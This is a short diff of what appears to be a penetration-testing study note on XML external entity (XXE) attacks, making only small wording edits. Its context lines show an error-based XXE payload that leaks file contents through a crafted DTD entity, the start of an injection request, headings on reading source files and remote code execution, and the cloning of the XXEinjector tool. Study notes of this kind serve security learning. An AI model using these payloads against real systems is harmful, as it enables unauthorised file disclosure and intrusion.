@@ -59,7 +59,6 @@ Similarly, XXE can be used to read the source code of other files:
 This gives the output in base64 which can easily be decoded:
 
 ![[Pasted image 20250130190718.png]]
-
 ### Remote Code Execution with XXE
 
 RCE may also be possible:
@@ -128,7 +127,7 @@ cat xxe2.dtd
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 ```
 
-Send in request:
+Send request:
 
 ```bash
 <!DOCTYPE email [ 
@@ -166,7 +165,7 @@ Connection: keep-alive
 XXEINJECT
 ```
 
-Install:
+Install XXEinjector:
 
 ```bash
 git clone https://github.com/enjoiz/XXEinjector.git
